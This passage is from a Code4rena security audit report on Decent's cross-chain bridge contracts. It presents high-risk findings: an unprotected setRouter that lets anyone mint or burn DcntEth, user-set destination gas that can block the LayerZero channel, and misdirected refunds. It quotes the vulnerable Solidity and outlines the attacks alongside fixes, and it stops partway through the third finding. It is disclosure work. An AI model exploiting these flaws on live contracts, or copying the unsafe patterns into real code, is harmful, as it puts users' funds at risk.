---
sponsor: "Decent"
slug: "2024-01-decent"
date: "2024-03-22"
title: "Decent"
findings: "https://github.com/code-423n4/2024-01-decent-findings/issues"
contest: 322
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Decent smart contract system written in Solidity. The audit took place between January 19—January 23 2024.

## Wardens

120 Wardens contributed reports to Decent:

  1. [windhustler](https://code4rena.com/@windhustler)
  2. [EV\_om](https://code4rena.com/@EV_om)
  3. [NPCsCorp](https://code4rena.com/@NPCsCorp) ([0xStalin](https://code4rena.com/@0xStalin) and [sin1st3r\_\_](https://code4rena.com/@sin1st3r__))
  4. [iamandreiski](https://code4rena.com/@iamandreiski)
  5. [haxatron](https://code4rena.com/@haxatron)
  6. [Soliditors](https://code4rena.com/@Soliditors) ([Tadev](https://code4rena.com/@Tadev), [3docSec](https://code4rena.com/@3docSec) and [0xBeirao](https://code4rena.com/@0xBeirao))
  7. [nuthan2x](https://code4rena.com/@nuthan2x)
  8. [deth](https://code4rena.com/@deth)
  9. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  10. [Aamir](https://code4rena.com/@Aamir)
  11. [peanuts](https://code4rena.com/@peanuts)
  12. [rouhsamad](https://code4rena.com/@rouhsamad)
  13. [monrel](https://code4rena.com/@monrel)
  14. [nmirchev8](https://code4rena.com/@nmirchev8)
  15. [Topmark](https://code4rena.com/@Topmark)
  16. [wangxx2026](https://code4rena.com/@wangxx2026)
  17. [gesha17](https://code4rena.com/@gesha17)
  18. [bart1e](https://code4rena.com/@bart1e)
  19. [NentoR](https://code4rena.com/@NentoR)
  20. [imare](https://code4rena.com/@imare)
  21. [DadeKuma](https://code4rena.com/@DadeKuma)
  22. [SBSecurity](https://code4rena.com/@SBSecurity) ([Slavcheww](https://code4rena.com/@Slavcheww) and [Blckhv](https://code4rena.com/@Blckhv))
  23. [c3phas](https://code4rena.com/@c3phas)
  24. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  25. [slvDev](https://code4rena.com/@slvDev)
  26. [0x11singh99](https://code4rena.com/@0x11singh99)
  27. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  28. [yongskiws](https://code4rena.com/@yongskiws)
  29. [0xepley](https://code4rena.com/@0xepley)
  30. [SAQ](https://code4rena.com/@SAQ)
  31. [catellatech](https://code4rena.com/@catellatech)
  32. [Shaheen](https://code4rena.com/@Shaheen)
  33. [Kaysoft](https://code4rena.com/@Kaysoft)
  34. [bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe)
  35. [Tendency](https://code4rena.com/@Tendency)
  36. [Kow](https://code4rena.com/@Kow)
  37. [ZdravkoHr](https://code4rena.com/@ZdravkoHr)
  38. [nobody2018](https://code4rena.com/@nobody2018)
  39. [ether\_sky](https://code4rena.com/@ether_sky)
  40. [kutugu](https://code4rena.com/@kutugu)
  41. [Giorgio](https://code4rena.com/@Giorgio)
  42. [0xJaeger](https://code4rena.com/@0xJaeger)
  43. [Eeyore](https://code4rena.com/@Eeyore)
  44. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  45. [Inference](https://code4rena.com/@Inference)
  46. [0xAadi](https://code4rena.com/@0xAadi)
  47. [cu5t0mpeo](https://code4rena.com/@cu5t0mpeo)
  48. [zaevlad](https://code4rena.com/@zaevlad)
  49. [dharma09](https://code4rena.com/@dharma09)
  50. [Raihan](https://code4rena.com/@Raihan)
  51. [GhK3Ndf](https://code4rena.com/@GhK3Ndf)
  52. [ihtishamsudo](https://code4rena.com/@ihtishamsudo)
  53. [foxb868](https://code4rena.com/@foxb868)
  54. [clara](https://code4rena.com/@clara)
  55. [albahaca](https://code4rena.com/@albahaca)
  56. [dutra](https://code4rena.com/@dutra)
  57. [Aymen0909](https://code4rena.com/@Aymen0909)
  58. [CDSecurity](https://code4rena.com/@CDSecurity) ([chrisdior4](https://code4rena.com/@chrisdior4) and [ddimitrov22](https://code4rena.com/@ddimitrov22))
  59. [th13vn](https://code4rena.com/@th13vn)
  60. [pkqs90](https://code4rena.com/@pkqs90)
  61. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  62. [antonttc](https://code4rena.com/@antonttc)
  63. [Timepunk](https://code4rena.com/@Timepunk)
  64. [ptsanev](https://code4rena.com/@ptsanev)
  65. [Matue](https://code4rena.com/@Matue)
  66. [0xdedo93](https://code4rena.com/@0xdedo93)
  67. [SovaSlava](https://code4rena.com/@SovaSlava)
  68. [Pechenite](https://code4rena.com/@Pechenite) ([Bozho](https://code4rena.com/@Bozho) and [radev\_sw](https://code4rena.com/@radev_sw))
  69. [0xmystery](https://code4rena.com/@0xmystery)
  70. [rjs](https://code4rena.com/@rjs)
  71. [IceBear](https://code4rena.com/@IceBear)
  72. [zxriptor](https://code4rena.com/@zxriptor)
  73. [mgf15](https://code4rena.com/@mgf15)
  74. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  75. [seraviz](https://code4rena.com/@seraviz)
  76. [0xSimeon](https://code4rena.com/@0xSimeon)
  77. [azanux](https://code4rena.com/@azanux)
  78. [0xprinc](https://code4rena.com/@0xprinc)
  79. [Timeless](https://code4rena.com/@Timeless)
  80. [slylandro\_star](https://code4rena.com/@slylandro_star)
  81. [0xdice91](https://code4rena.com/@0xdice91)
  82. [Nikki](https://code4rena.com/@Nikki)
  83. [ke1caM](https://code4rena.com/@ke1caM)
  84. [Greed](https://code4rena.com/@Greed)
  85. [al88nsk](https://code4rena.com/@al88nsk)
  86. [DarkTower](https://code4rena.com/@DarkTower) ([Gelato\_ST](https://code4rena.com/@Gelato_ST), [Maroutis](https://code4rena.com/@Maroutis), [OxTenma](https://code4rena.com/@OxTenma), and [0xrex](https://code4rena.com/@0xrex))
  87. [Timenov](https://code4rena.com/@Timenov)
  88. [ravikiranweb3](https://code4rena.com/@ravikiranweb3)
  89. [mrudenko](https://code4rena.com/@mrudenko)
  90. [0xBugSlayer](https://code4rena.com/@0xBugSlayer)
  91. [GeekyLumberjack](https://code4rena.com/@GeekyLumberjack)
  92. [adeolu](https://code4rena.com/@adeolu)
  93. [stealth](https://code4rena.com/@stealth)
  94. [simplor](https://code4rena.com/@simplor)
  95. [PUSH0](https://code4rena.com/@PUSH0) ([jojo](https://code4rena.com/@jojo) and [thekmj](https://code4rena.com/@thekmj))
  96. [0xabhay](https://code4rena.com/@0xabhay)
  97. [darksnow](https://code4rena.com/@darksnow)
  98. [m4ttm](https://code4rena.com/@m4ttm)
  99. [0xE1](https://code4rena.com/@0xE1)
  100. [boredpukar](https://code4rena.com/@boredpukar)
  101. [abiih](https://code4rena.com/@abiih)
  102. [bareli](https://code4rena.com/@bareli)
  103. [vnavascues](https://code4rena.com/@vnavascues)
  104. [d4r3d3v1l](https://code4rena.com/@d4r3d3v1l)
  105. [0xPluto](https://code4rena.com/@0xPluto)
  106. [Krace](https://code4rena.com/@Krace)
  107. [kodyvim](https://code4rena.com/@kodyvim)
  108. [Tigerfrake](https://code4rena.com/@Tigerfrake)
  109. [JanuaryPersimmon2024](https://code4rena.com/@JanuaryPersimmon2024)
  110. [piyushshukla](https://code4rena.com/@piyushshukla)

This audit was judged by [0xsomeone](https://code4rena.com/@0xsomeone).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 9 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 5 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 15 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 6 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Decent repository](https://github.com/code-423n4/2024-01-decent), and is composed of 11 smart contracts written in the Solidity programming language and includes 1209 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **vuln-detector** from warden(s) [oualidpro](https://code4rena.com/@oualidpro), generated the [Automated Findings report](https://github.com/code-423n4/2024-01-decent/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (4)
## [[H-01] Anyone can update the address of the Router in the DcntEth contract to any address they would like to set.](https://github.com/code-423n4/2024-01-decent-findings/issues/721)
*Submitted by [NPCsCorp](https://github.com/code-423n4/2024-01-decent-findings/issues/721), also found by [seraviz](https://github.com/code-423n4/2024-01-decent-findings/issues/741), [dutra](https://github.com/code-423n4/2024-01-decent-findings/issues/731), [0xSimeon](https://github.com/code-423n4/2024-01-decent-findings/issues/724), [EV\_om](https://github.com/code-423n4/2024-01-decent-findings/issues/704), [azanux](https://github.com/code-423n4/2024-01-decent-findings/issues/682), [Aymen0909](https://github.com/code-423n4/2024-01-decent-findings/issues/633), [0xprinc](https://github.com/code-423n4/2024-01-decent-findings/issues/603), [ZdravkoHr](https://github.com/code-423n4/2024-01-decent-findings/issues/578), [0x11singh99](https://github.com/code-423n4/2024-01-decent-findings/issues/565), [CDSecurity](https://github.com/code-423n4/2024-01-decent-findings/issues/546), [nuthan2x](https://github.com/code-423n4/2024-01-decent-findings/issues/524), [GhK3Ndf](https://github.com/code-423n4/2024-01-decent-findings/issues/509), [0xAadi](https://github.com/code-423n4/2024-01-decent-findings/issues/496), [Eeyore](https://github.com/code-423n4/2024-01-decent-findings/issues/470), ZanyBonzy ([1](https://github.com/code-423n4/2024-01-decent-findings/issues/467), [2](https://github.com/code-423n4/2024-01-decent-findings/issues/465)), [DadeKuma](https://github.com/code-423n4/2024-01-decent-findings/issues/433), [Matue](https://github.com/code-423n4/2024-01-decent-findings/issues/431), [Timeless](https://github.com/code-423n4/2024-01-decent-findings/issues/339), [Giorgio](https://github.com/code-423n4/2024-01-decent-findings/issues/331), [slylandro\_star](https://github.com/code-423n4/2024-01-decent-findings/issues/318), [0xdice91](https://github.com/code-423n4/2024-01-decent-findings/issues/317), [Nikki](https://github.com/code-423n4/2024-01-decent-findings/issues/312), [ke1caM](https://github.com/code-423n4/2024-01-decent-findings/issues/308), [cu5t0mpeo](https://github.com/code-423n4/2024-01-decent-findings/issues/292), [Greed](https://github.com/code-423n4/2024-01-decent-findings/issues/288), [nobody2018](https://github.com/code-423n4/2024-01-decent-findings/issues/272), [Tendency](https://github.com/code-423n4/2024-01-decent-findings/issues/271), [Inference](https://github.com/code-423n4/2024-01-decent-findings/issues/224), [al88nsk](https://github.com/code-423n4/2024-01-decent-findings/issues/223), [DarkTower](https://github.com/code-423n4/2024-01-decent-findings/issues/205), [th13vn](https://github.com/code-423n4/2024-01-decent-findings/issues/202), [Soliditors](https://github.com/code-423n4/2024-01-decent-findings/issues/182), [Timenov](https://github.com/code-423n4/2024-01-decent-findings/issues/166), [wangxx2026](https://github.com/code-423n4/2024-01-decent-findings/issues/165), [NentoR](https://github.com/code-423n4/2024-01-decent-findings/issues/159), [ether\_sky](https://github.com/code-423n4/2024-01-decent-findings/issues/155), [peanuts](https://github.com/code-423n4/2024-01-decent-findings/issues/144), [MrPotatoMagic](https://github.com/code-423n4/2024-01-decent-findings/issues/131), [ravikiranweb3](https://github.com/code-423n4/2024-01-decent-findings/issues/125), [mrudenko](https://github.com/code-423n4/2024-01-decent-findings/issues/109), [Kaysoft](https://github.com/code-423n4/2024-01-decent-findings/issues/101), [deth](https://github.com/code-423n4/2024-01-decent-findings/issues/86), [0xBugSlayer](https://github.com/code-423n4/2024-01-decent-findings/issues/64), [nmirchev8](https://github.com/code-423n4/2024-01-decent-findings/issues/63), [GeekyLumberjack](https://github.com/code-423n4/2024-01-decent-findings/issues/57), [Aamir](https://github.com/code-423n4/2024-01-decent-findings/issues/49), [adeolu](https://github.com/code-423n4/2024-01-decent-findings/issues/39), [stealth](https://github.com/code-423n4/2024-01-decent-findings/issues/32), [simplor](https://github.com/code-423n4/2024-01-decent-findings/issues/22), [PUSH0](https://github.com/code-423n4/2024-01-decent-findings/issues/20), [0xabhay](https://github.com/code-423n4/2024-01-decent-findings/issues/19), [darksnow](https://github.com/code-423n4/2024-01-decent-findings/issues/17), [haxatron](https://github.com/code-423n4/2024-01-decent-findings/issues/14), [m4ttm](https://github.com/code-423n4/2024-01-decent-findings/issues/740), [0xE1](https://github.com/code-423n4/2024-01-decent-findings/issues/535), [boredpukar](https://github.com/code-423n4/2024-01-decent-findings/issues/460), [abiih](https://github.com/code-423n4/2024-01-decent-findings/issues/451), [0xSmartContract](https://github.com/code-423n4/2024-01-decent-findings/issues/427), [bareli](https://github.com/code-423n4/2024-01-decent-findings/issues/384), mgf15 ([1](https://github.com/code-423n4/2024-01-decent-findings/issues/366), [2](https://github.com/code-423n4/2024-01-decent-findings/issues/364), [3](https://github.com/code-423n4/2024-01-decent-findings/issues/363), [4](https://github.com/code-423n4/2024-01-decent-findings/issues/359)), [vnavascues](https://github.com/code-423n4/2024-01-decent-findings/issues/345), [d4r3d3v1l](https://github.com/code-423n4/2024-01-decent-findings/issues/322), [zaevlad](https://github.com/code-423n4/2024-01-decent-findings/issues/198), [0xPluto](https://github.com/code-423n4/2024-01-decent-findings/issues/171), [rouhsamad](https://github.com/code-423n4/2024-01-decent-findings/issues/168), [Krace](https://github.com/code-423n4/2024-01-decent-findings/issues/146), [kodyvim](https://github.com/code-423n4/2024-01-decent-findings/issues/140), [Tigerfrake](https://github.com/code-423n4/2024-01-decent-findings/issues/53), [JanuaryPersimmon2024](https://github.com/code-423n4/2024-01-decent-findings/issues/490), and [piyushshukla](https://github.com/code-423n4/2024-01-decent-findings/issues/672)*

By allowing anybody to set the address of the Router contract to any address they want to set it allows malicious users to get access to the mint and burn functions of the DcntEth contract.

### Proof of Concept

The [`DcntEth::setRouter() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L20-L22) has not an access control to restrict who can call this function. This allows anybody to set the address of the router contract to any address they'd like to set it.

> DcntEth.sol

```solidity
//@audit-issue => No access control to restrict who can set the address of the router contract
function setRouter(address _router) public {
    router = _router;
}
```

The functions [`DcntEth::mint() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L24-L26) & [`DcntEth::burn() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L28-L30) can be called only by the router contract.

> DcntEth.sol

```solidity

    //@audit-info => Only the router can call the mint()
    function mint(address _to, uint256 _amount) public onlyRouter {
        _mint(_to, _amount);
    }

    //@audit-info => Only the router can call the burn()
    function burn(address _from, uint256 _amount) public onlyRouter {
        _burn(_from, _amount);
    }
```

A malicious user can set the address of the router contract to an account of their own and:

1.  Gain access to mint unlimited amounts of DcntEth token, which could be used to disrupt the crosschain accounting mechanism, or to steal the deposited weth in the DecentEthRouter contract.
2.  Burn all the DcntEth tokens that were issued to the DecentEthRouter contract when liquidity providers deposited their WETH or ETH into it.
3.  Cause a DoS to the add and remove liquidity functions of the DecentEthRouter contract. All of these functions end up calling the [`DcntEth::mint() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L24-L26) or the [`DcntEth::burn() function`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DcntEth.sol#L28-L30), if the router address is set to be different than the address of the DecentEthRouter, all the calls made from the DecentEthRouter to the DcnEth contract will revert.

> DecentEthRouter.sol

<details>

```solidity

    /// @inheritdoc IDecentEthRouter
    function addLiquidityEth()
        public
        payable
        onlyEthChain
        userDepositing(msg.value)
    {
        weth.deposit{value: msg.value}();
        
        //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert
        dcntEth.mint(address(this), msg.value);
    }

    /// @inheritdoc IDecentEthRouter
    function removeLiquidityEth(
        uint256 amount
    ) public onlyEthChain userIsWithdrawing(amount) {

      //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert
        dcntEth.burn(address(this), amount);
        weth.withdraw(amount);
        payable(msg.sender).transfer(amount);
    }

    /// @inheritdoc IDecentEthRouter
    function addLiquidityWeth(
        uint256 amount
    ) public payable userDepositing(amount) {
        weth.transferFrom(msg.sender, address(this), amount);

        //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert
        dcntEth.mint(address(this), amount);
    }

    /// @inheritdoc IDecentEthRouter
    function removeLiquidityWeth(
        uint256 amount
    ) public userIsWithdrawing(amount) {

      //@audit-issue => If router in the dcnteth contract is not set to the address of the DecentEthRouter, this call will revert
        dcntEth.burn(address(this), amount);
        weth.transfer(msg.sender, amount);
    }
```

</details>

### Recommended Mitigation Steps

Make sure to add an Acess Control mechanism to limit who can set the address of the Router in the DcnEth contract.


**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/721#issuecomment-1925323247):**
 > This and all relevant submissions correctly specify that the lack of access control in the `DcntEth::setRouter` function can be exploited maliciously and effectively compromise the entire TVL of the Decent ETH token.
> 
> A high-risk severity is appropriate, and this submission was selected as the best due to detailing all possible impacts:
> 
> - Arbitrary mints of the token to withdraw funds provided as liquidity to `UTB`
> - Arbitrary burns to sabotage liquidity pools and other escrow-based contracts
> - Sabotage of liquidity provision function invocations

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/721#issuecomment-1942664512)**

***

## [[H-02] Due to missing checks on minimum gas passed through LayerZero, executions can fail on the destination chain](https://github.com/code-423n4/2024-01-decent-findings/issues/525)
*Submitted by [iamandreiski](https://github.com/code-423n4/2024-01-decent-findings/issues/525), also found by [NPCsCorp](https://github.com/code-423n4/2024-01-decent-findings/issues/728), [EV\_om](https://github.com/code-423n4/2024-01-decent-findings/issues/697), windhustler ([1](https://github.com/code-423n4/2024-01-decent-findings/issues/670), [2](https://github.com/code-423n4/2024-01-decent-findings/issues/668)), and [nuthan2x](https://github.com/code-423n4/2024-01-decent-findings/issues/622)*

<https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L148-L194> 

<https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L80-L111>

In LayerZero, the destination chain's function call requires a specific gas amount; otherwise, it will revert with an out-of-gas exception. It falls under the responsibility of the User Application to ensure that appropriate limits are established. These limits guide relayers in specifying the correct gas amount on the source chain, preventing users from inputting insufficient values for gas.

The contract logic in `DecentEthRouter`, assumes that a user will first get their estimated fees through `estimateSendAndCallFee()` and pass it as an argument in either `bridge()` or `bridgeWithPayload()` to be added to the calculation together with the hardcoded `GAS_FOR_RELAY` so that it can be passed as the adapter params when `CommonOFT.LzCallParams` is called, although this is not enforced and is left on the user's responsibility.

A user can pass an arbitrary value as the `_dstGasForCall` argument to be added to the hardcoded `GAS_FOR_RELAY` fee, thus sending less gas than required which can lead to out-of-gas exceptions.

Once the message is received by destination, the message is considered delivered (transitioning from INFLIGHT to either SUCCESS or STORED), even though it threw an out-of-gas error.

Any uncaught errors/exceptions (including out-of-gas) will cause the message to transition into STORED. A STORED message will block the delivery of any future message from source to all destination on the same destination chain and can be retried until the message becomes SUCCESS.

As per: <https://layerzero.gitbook.io/docs/faq/messaging-properties>

### Proof of Concept

According to the LayerZero integration checklist: <br><https://layerzero.gitbook.io/docs/troubleshooting/layerzero-integration-checklist>

LayerZero recommends a 200,000 amount of gas to be enough for most chains and is set as default.

*   "200k for OFT for all EVMs except Arbitrum is enough. For Arbitrum, set as 2M."

In the DecentEthRouter, the `GAS_FOR_RELAY` is hardcoded at 100,000.

            uint256 GAS_FOR_RELAY = 100000;
            uint256 gasAmount = GAS_FOR_RELAY + _dstGasForCall;

The contract logic assumes that a user would willingly first call the `estimateSendAndCallFee` to get the `nativeFee` + the `zroFee` fom `dcntEth.estimateSendAndCallFee` and then pass the addition of the nativeFee + zeroFee as the `_dstGasForCall` argument when calling `bridge()` or `bridgeWithPayload()`:

        function bridgeWithPayload(
            uint16 _dstChainId,
            address _toAddress,
            uint _amount,
            bool deliverEth,
            uint64 _dstGasForCall,
            bytes memory additionalPayload
        ) public payable {
            return
                _bridgeWithPayload(
                    MT_ETH_TRANSFER_WITH_PAYLOAD,
                    _dstChainId,
                    _toAddress,
                    _amount,
                    _dstGasForCall,
                    additionalPayload,
                    deliverEth
                );
        }

Once the internal `_bridgeWithPayload` function is called:

```
            bytes32 destinationBridge,
            bytes memory adapterParams,
            bytes memory payload
        ) = _getCallParams(
                msgType,
                _toAddress,
                _dstChainId,
                _dstGasForCall,
                deliverEth,
                additionalPayload
            );


        ICommonOFT.LzCallParams memory callParams = ICommonOFT.LzCallParams({
            refundAddress: payable(msg.sender),
            zroPaymentAddress: address(0x0),
            adapterParams: adapterParams
        });

```

It calls the `_getCallParams` function which will calculate and pack the needed arguments to be passed as the LayerZero call params, without performing any checks whether the total gas amount is sufficient or that the user passed argument `_dstGasForCall` is greater than the total of `(uint nativeFee, uint zroFee) = dcntEth.estimateSendAndCallFee`.

        function _getCallParams(
            uint8 msgType,
            address _toAddress,
            uint16 _dstChainId,
            uint64 _dstGasForCall,
            bool deliverEth,
            bytes memory additionalPayload
        )
            private
            view
            returns (
                bytes32 destBridge,
                bytes memory adapterParams,
                bytes memory payload
            )
        {
            uint256 GAS_FOR_RELAY = 100000;
            uint256 gasAmount = GAS_FOR_RELAY + _dstGasForCall;
            adapterParams = abi.encodePacked(PT_SEND_AND_CALL, gasAmount);

This can lead to failed messages on the destination. Which would yield the above-message results of a possible blockage in the communication with the source and destination.

*   A malicious or an unbeknownst user can pass 1,000 as an argument for `_dstGasForCall`, making the total gas forwarded to the `LzCallParams()` 101,000 which will make a certain type of calls fail (depending on payload), and especially calls made on Arbitrum.

### Recommended Mitigation Steps

Validate/require that the `_dstGasForCall` parameter is greater than `nativeFee` + `zroFee` or re-engineer the architecture to make the `estimateSendAndCallFee()` function a mandatory step of the process.

**[0xsomeone (Judge) increased severity to High and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/525#issuecomment-1923713863):**
 > This and all duplicate exhibits highlight that the `GAS_FOR_RELAY` is a hard-coded value and that the overall gas supplied for a cross-chain call can be controlled by a user.
> 
> A severity of high is appropriate given that the cross-chain LayerZero channel will be permanently blocked.
> 
> None of the submissions have correctly proposed a solution as a mere adjustment of the `GAS_FOR_RELAY` is insufficient. The `DecentBridgeExecutor` permits arbitrary calls to be made that can force the transaction to run out-of-gas regardless of the gas limit imposed. This is properly defined in [#697](https://github.com/code-423n4/2024-01-decent-findings/issues/697).
> 
> A valid solution for this problem would be a combination of a minimum enforced at the transaction level and a maximum gas consumed enforced at the executor level, ensuring that the gas remainder **after the executor performs the arbitrary call** is enough to store the failed message. This can be achieved by performing a subtraction from the `gasleft` value (hard to implement as it would need to take into account the cost of `keccak256` encoding the data payload) or by enforcing a fixed value that should be much less than the minimum imposed on the source chain.
> 
> This submission was selected as the best given that it illustrates in-depth knowledge of the LayerZero system states and correctly highlights that a user can also maliciously block the channel.

**[wkantaros (Decent) acknowledged via duplicate #212, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/212#issuecomment-1917870512):**
> This vulnerability is not a concern in Layer Zero v2. Decent designed the contracts expecting to use LZ v2 and have since implemented this upgrade.

***

## [[H-03] When `DecentBridgeExecutor.execute` fails, funds will be sent to a random address](https://github.com/code-423n4/2024-01-decent-findings/issues/436)
*Submitted by [DadeKuma](https://github.com/code-423n4/2024-01-decent-findings/issues/436), also found by [NPCsCorp](https://github.com/code-423n4/2024-01-decent-findings/issues/720), [MrPotatoMagic](https://github.com/code-423n4/2024-01-decent-findings/issues/652), [SBSecurity](https://github.com/code-423n4/2024-01-decent-findings/issues/619), [deth](https://github.com/code-423n4/2024-01-decent-findings/issues/609), [nmirchev8](https://github.com/code-423n4/2024-01-decent-findings/issues/510), [Tendency](https://github.com/code-423n4/2024-01-decent-findings/issues/232), [ether\_sky](https://github.com/code-423n4/2024-01-decent-findings/issues/176), [Kow](https://github.com/code-423n4/2024-01-decent-findings/issues/122), [haxatron](https://github.com/code-423n4/2024-01-decent-findings/issues/84), [EV\_om](https://github.com/code-423n4/2024-01-decent-findings/issues/701), [0xJaeger](https://github.com/code-423n4/2024-01-decent-findings/issues/666), [ZdravkoHr](https://github.com/code-423n4/2024-01-decent-findings/issues/631), [Giorgio](https://github.com/code-423n4/2024-01-decent-findings/issues/489), [Soliditors](https://github.com/code-423n4/2024-01-decent-findings/issues/281), [Aamir](https://github.com/code-423n4/2024-01-decent-findings/issues/263), [Eeyore](https://github.com/code-423n4/2024-01-decent-findings/issues/474), [Inference](https://github.com/code-423n4/2024-01-decent-findings/issues/284), and [kutugu](https://github.com/code-423n4/2024-01-decent-findings/issues/93)*

<https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L101-L105> 

<https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentBridgeExecutor.sol#L63>

When the `DecentBridgeExecutor._executeWeth/_executeEth` target call fails, a refund is issued to the `from` address.

However, this address is wrongly set, so those refunds will be permanently lost.

### Proof of Concept

`UTB.bridgeAndExecute` ([Link](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L259)) calls `DecentBridgeAdapter.bridge` ([Link](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L289)), which calls `DecentEthRouter.bridgeWithPayload` ([Link](https://github.com/code-423n4/2024-01-decent/blob/main/src/bridge_adapters/DecentBridgeAdapter.sol#L117)), where the payload is constructed ([Link](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L148)):

```solidity
	function _bridgeWithPayload(
	    uint8 msgType,
	    uint16 _dstChainId,
	    address _toAddress,
	    uint _amount,
	    uint64 _dstGasForCall,
	    bytes memory additionalPayload,
	    bool deliverEth
	) internal {
	    (
	        bytes32 destinationBridge,
	        bytes memory adapterParams,
	        bytes memory payload
	    ) = _getCallParams(
	            msgType,
	            _toAddress,
	            _dstChainId,
	            _dstGasForCall,
	            deliverEth,
	            additionalPayload
	        );
	    ...
```

Inside `_getCallParams` the `from` address is the `msg.sender`, i.e. the `DecentBridgeAdapter` address on the source chain ([Link](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L101-L105)):

```solidity
	function _getCallParams(
	    uint8 msgType,
	    address _toAddress,
	    uint16 _dstChainId,
	    uint64 _dstGasForCall,
	    bool deliverEth,
	    bytes memory additionalPayload
	)
	    private
	    view
	    returns (
	        bytes32 destBridge,
	        bytes memory adapterParams,
	        bytes memory payload
	    )
	{
	    uint256 GAS_FOR_RELAY = 100000;
	    uint256 gasAmount = GAS_FOR_RELAY + _dstGasForCall;
	    adapterParams = abi.encodePacked(PT_SEND_AND_CALL, gasAmount);
	    destBridge = bytes32(abi.encode(destinationBridges[_dstChainId]));
	    if (msgType == MT_ETH_TRANSFER) {
@>	        payload = abi.encode(msgType, msg.sender, _toAddress, deliverEth);
	    } else {
	        payload = abi.encode(
	            msgType,
@>	            msg.sender, //@audit 'from' address
	            _toAddress,
	            deliverEth,
	            additionalPayload
	        );
	    }
	}
```

After the payload is constructed, `DecentEthRouter` sends the message:

```solidity
	dcntEth.sendAndCall{value: gasValue}(
	    address(this), // from address that has dcntEth (so DecentRouter)
	    _dstChainId,
	    destinationBridge, // toAddress
	    _amount, // amount
	    payload, //payload (will have recipients address)
	    _dstGasForCall, // dstGasForCall
	    callParams // refundAddress, zroPaymentAddress, adapterParams
	);
```

Finally, on the destination chain, `DecentEthRouter` will receive the message ([Link](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L245-L246)):

```solidity
	function onOFTReceived(
	    uint16 _srcChainId,
	    bytes calldata,
	    uint64,
	    bytes32,
	    uint _amount,
	    bytes memory _payload
	) external override onlyLzApp {
		//@audit from is the decentBridgeAdapter address on the source chain
	    (uint8 msgType, address _from, address _to, bool deliverEth) = abi
	        .decode(_payload, (uint8, address, address, bool));
	    ...
	}
```

At the end of this function, the `executor` is invoked with the same `_from` address:

```solidity
	} else {
	    weth.approve(address(executor), _amount);
	    executor.execute(_from, _to, deliverEth, _amount, callPayload);
	}
```

Finally, this is the `execute` function in `DecentBridgeExecutor` ([Link](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentBridgeExecutor.sol#L68)):

```solidity
	function execute(
	    address from,
	    address target,
	    bool deliverEth,
	    uint256 amount,
	    bytes memory callPayload
	) public onlyOwner {
	    weth.transferFrom(msg.sender, address(this), amount);
	    if (!gasCurrencyIsEth || !deliverEth) {
	        _executeWeth(from, target, amount, callPayload);
	    } else {
	        _executeEth(from, target, amount, callPayload);
	    }
	}
```

